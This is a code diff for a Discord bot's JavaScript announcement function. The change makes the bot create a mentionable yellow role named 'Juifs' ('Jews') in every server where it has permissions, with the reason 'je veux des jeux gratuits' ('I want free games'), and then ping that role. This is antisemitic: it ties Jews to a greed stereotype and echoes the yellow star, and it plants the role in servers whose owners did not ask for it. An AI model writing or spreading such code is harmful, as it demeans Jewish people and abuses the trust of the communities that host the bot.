@@ -43,21 +43,21 @@ async function ping(override, servid) {
 		.setFooter("@TopMage");
     let serveurs = bot.guilds.cache.array();
     for (let serv of serveurs) {
-		if (override && serv.id === servid) {
-			let member = serv.members.cache.find(m => m.id === bot.user.id);
-			if (member && member.permissions.has([2048, 16, 268435456])) {
-				// Role
-				let role = serv.roles.cache.find(r => r.name === "Juifs");
-				if (role === undefined) {
-					role = await serv.roles.create({
-						data: {
-							name: 'Juifs',
-							color: 'YELLOW',
-							mentionable: true
-						},
-						reason: 'je veux des jeux gratuits',
-					});
-				}
+		let member = serv.members.cache.find(m => m.id === bot.user.id);
+		if (member && member.permissions.has([2048, 16, 268435456])) {
+			// Role
+			let role = serv.roles.cache.find(r => r.name === "Juifs");
+			if (role === undefined) {
+				role = await serv.roles.create({
+					data: {
+						name: 'Juifs',
+						color: 'YELLOW',
+						mentionable: true
+					},
+					reason: 'je veux des jeux gratuits',
+				});
+			}
+			if (!override) {
 				fs.readFile('data/channels.json', 'utf8', (err, data) => {
 					if (err) throw err;
 					let json = JSON.parse(data);
@@ -67,7 +67,8 @@ async function ping(override, servid) {
 
 					channel.send("<@&"+role.id+">", embed).catch(console.error);
 				});
-			}
+			} else if (serv.id === servid)
+				channel.send("<@&"+role.id+">", embed).catch(console.error);
 		}
     }
 }
